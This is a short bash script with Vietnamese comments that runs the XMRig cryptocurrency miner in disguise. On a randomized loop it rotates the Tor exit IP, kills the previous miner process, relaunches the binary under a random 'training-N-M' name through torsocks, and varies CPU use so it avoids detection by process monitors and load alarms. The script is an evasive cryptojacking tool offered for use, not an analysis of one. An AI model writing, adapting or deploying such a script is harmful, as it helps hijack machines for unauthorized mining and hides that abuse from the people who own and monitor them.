#!/bin/bash

while true; do
  # Ngủ ngẫu nhiên từ 5 đến 10 phút
  sleep $((RANDOM % 300 + 300))

  echo "Đang yêu cầu Tor thay đổi IP..."
  kill -HUP $(pgrep tor)
  echo "Tor đã thay đổi IP."

  # Dừng XMRig với tên cũ
  if [ -f /root/xmrig_name.txt ]; then
    xmrig_name=$(cat /root/xmrig_name.txt)
    echo "Dừng XMRig với tên cũ..."
    pkill -f $xmrig_name
    rm -f /root/xmrig_name.txt
  fi

  # Tạo tên mới cho XMRig
  echo "Tạo tên mới cho XMRig..."
  RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
  cp /root/work/xmrig-${VERSION}/xmrig_backup /root/work/$RANDOM_NAME
  chmod +x /root/work/$RANDOM_NAME
  echo $RANDOM_NAME > /root/xmrig_name.txt

  # Chạy lại XMRig với tên mới
  echo "Chạy lại XMRig với tên mới $RANDOM_NAME..."
  cpu_hint=$(shuf -i 70-90 -n 1)
  torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$cpu_hint &
done
